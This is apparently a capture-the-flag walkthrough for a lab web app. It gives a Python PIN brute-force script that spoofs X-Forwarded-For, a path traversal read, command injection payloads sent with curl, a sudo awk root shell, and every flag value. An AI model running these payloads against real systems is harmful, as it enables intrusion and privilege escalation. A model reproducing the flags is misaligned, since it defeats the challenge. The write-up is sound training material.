## Attack Chain Overview

| Flag | Points | Vulnerability | Technique |
|------|--------|---------------|-----------|
| FLAG1 | 200 | X-Forwarded-For trust | Header spoofing → rate limit bypass |
| FLAG2 | 200 | Hidden admin endpoint | Directory enumeration |
| FLAG3 | 300 | Path traversal | File read via `../` |
| FLAG4 | 400 | Command injection | Shell injection → RCE |
| FLAG5 | 500 | Sudo misconfiguration | GTFOBins (awk) → root |

**Total**: 1,600 points

---

## FLAG 1: Rate Limit Bypass (200 points)

### Vulnerability

The application trusts the `X-Forwarded-For` header without validation:

```python
def get_client_ip():
    # VULNERABLE: Trusting X-Forwarded-For without validation
    forwarded_for = request.headers.get('X-Forwarded-For')
    if forwarded_for:
        return forwarded_for.split(',')[0].strip()
    return request.remote_addr
```

Since rate limiting is tracked per IP address, attackers can spoof different IPs to bypass the 5-request limit.

### Exploitation

**Step 1**: Download the wordlist

```bash
curl http://localhost:4003/wordlist.txt -o wordlist.txt
```

**Step 2**: Create exploit script

```python
#!/usr/bin/env python3
import json
from urllib import request as url_request

TARGET_URL = "http://localhost:4003/api/login"
WORDLIST_URL = "http://localhost:4003/wordlist.txt"

def try_pin(pin, fake_ip):
    data = json.dumps({"pin": pin}).encode('utf-8')
    req = url_request.Request(
        TARGET_URL,
        data=data,
        headers={
            'Content-Type': 'application/json',
            'X-Forwarded-For': fake_ip  # Spoof the IP address
        },
        method='POST'
    )

    try:
        with url_request.urlopen(req) as response:
            return json.loads(response.read().decode('utf-8')), response.status
    except Exception as e:
        return None, None

# Download wordlist
with url_request.urlopen(WORDLIST_URL) as response:
    wordlist = response.read().decode('utf-8').strip().split('\n')

print(f"[*] Loaded {len(wordlist)} PINs from wordlist")
print("[*] Starting brute force with X-Forwarded-For bypass...\n")

for i, pin in enumerate(wordlist, 1):
    # Use a different fake IP for each attempt
    fake_ip = f"10.0.{i // 256}.{i % 256}"
    response_data, status_code = try_pin(pin, fake_ip)

    if status_code == 200 and response_data.get('success'):
        print(f"\n[+] SUCCESS! Found correct PIN: {pin}")
        print(f"[+] FLAG1: {response_data.get('flag')}")
        print(f"[+] Token: {response_data.get('token')}")
        break
    else:
        print(f"[-] Attempt {i}: PIN {pin} (IP: {fake_ip}) - Failed", end='\r')
```

**Step 3**: Run the exploit

```bash
python3 exploit.py
```

Output:
```
[+] SUCCESS! Found correct PIN: 7394
[+] FLAG1: DUNO{8d2525dacfb4175efce7d3c018959f23}
[+] Token: a1b2c3d4e5f6...
```

**FLAG 1**: `DUNO{8d2525dacfb4175efce7d3c018959f23}`

---

## FLAG 2: Admin Endpoint Discovery (200 points)

### Vulnerability

The login response includes an authentication token, but doesn't document what to do with it. Players must discover the `/api/admin` endpoint through enumeration.

### Exploitation

**Manual Discovery**:

```bash
# Try common admin paths
curl http://localhost:4003/admin           # 404
curl http://localhost:4003/api/admin       # 401 (Unauthorized)

# Use token from FLAG1
TOKEN="a1b2c3d4e5f6..."  # From FLAG1
curl http://localhost:4003/api/admin \
  -H "Authorization: Bearer $TOKEN"
```

**Automated Discovery** (dirb/gobuster):

```bash
gobuster dir -u http://localhost:4003/api/ -w /usr/share/wordlists/dirb/common.txt
```

Response:
```json
{
  "success": true,
  "message": "Admin access granted.",
  "flag": "DUNO{0d86821e52d63b25a68c4043b101a36f}",
  "admin_data": {
    "total_users": 42,
    "active_sessions": 1,
    "system": "EverSec Auth Gateway v2.1"
  }
}
```

**FLAG 2**: `DUNO{0d86821e52d63b25a68c4043b101a36f}`

---

## FLAG 3: Path Traversal (300 points)

### Vulnerability

The `/api/logs` endpoint accepts a `file` parameter without path sanitization:

```python
@app.route('/api/logs', methods=['GET'])
def api_logs():
    # Get requested log file (defaults to app.log)
    log_file = request.args.get('file', 'app.log')

    # VULNERABLE: No path sanitization!
    log_path = f'/app/logs/{log_file}'

    with open(log_path, 'r') as f:
        content = f.read()
    return jsonify({'success': True, 'file': log_file, 'content': content})
```

### Exploitation

**Discover the endpoint**:

```bash
# Try common admin paths
curl http://localhost:4003/api/logs \
  -H "Authorization: Bearer $TOKEN"
```

Default response shows `app.log` contents. Now try path traversal:

```bash
# Read flag3.txt
curl http://localhost:4003/api/logs?file=../flag3.txt \
  -H "Authorization: Bearer $TOKEN"
```

Response:
```json
{
  "success": true,
  "file": "../flag3.txt",
  "content": "DUNO{dc6175f5b72ed1a094baa17f81f9e704}\n"
}
```

**FLAG 3**: `DUNO{dc6175f5b72ed1a094baa17f81f9e704}`

---

## FLAG 4: Command Injection (400 points)

### Vulnerability

The `/api/health` endpoint accepts a `check` parameter that's directly interpolated into a shell command:

```python
@app.route('/api/health', methods=['POST'])
def api_health():
    check_type = data['check']

    # VULNERABLE: Command injection via shell=True
    result = subprocess.run(
        f'df -h | head -n 3 && echo "---" && {check_type}',
        shell=True,
        capture_output=True,
        text=True,
        timeout=5
    )

    return jsonify({'success': True, 'output': result.stdout})
```

### Exploitation

**Test the endpoint**:

```bash
curl -X POST http://localhost:4003/api/health \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"check": "disk"}'
```

**Inject commands**:

```bash
# Read flag4.txt
curl -X POST http://localhost:4003/api/health \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"check": "cat /home/ctfuser/flag4.txt"}'
```

Response:
```json
{
  "success": true,
  "check": "cat /home/ctfuser/flag4.txt",
  "output": "Filesystem      Size  Used Avail Use% Mounted on\noverlay          59G   35G   22G  63% /\n---\nDUNO{94a848cc9a286237c497c31b15a32d39}\n"
}
```

**FLAG 4**: `DUNO{94a848cc9a286237c497c31b15a32d39}`

---

## FLAG 5: Sudo Privilege Escalation (500 points)

### Vulnerability

The `ctfuser` account has NOPASSWD sudo access to `/usr/bin/awk`:

```bash
$ sudo -l
User ctfuser may run the following commands:
    (ALL) NOPASSWD: /usr/bin/awk
```

This is a classic GTFOBins privilege escalation vector.

### Exploitation

**Get a shell** (from FLAG4 RCE):

```bash
# Inject a reverse shell or use interactive command injection
curl -X POST http://localhost:4003/api/health \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"check": "sudo -l"}'
```

**Escalate to root** using GTFOBins:

```bash
# Method 1: Direct command execution
curl -X POST http://localhost:4003/api/health \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"check": "sudo awk '\''BEGIN {system(\"cat /root/flag5.txt\")}'\''"}'
```

**Alternative** (if you have shell access):

```bash
# Get shell from FLAG4, then:
sudo awk 'BEGIN {system("/bin/sh")}'
# Now you're root
cat /root/flag5.txt
```

**FLAG 5**: `DUNO{35ef905af35d4692554eb42dd3eee7d1}`

---

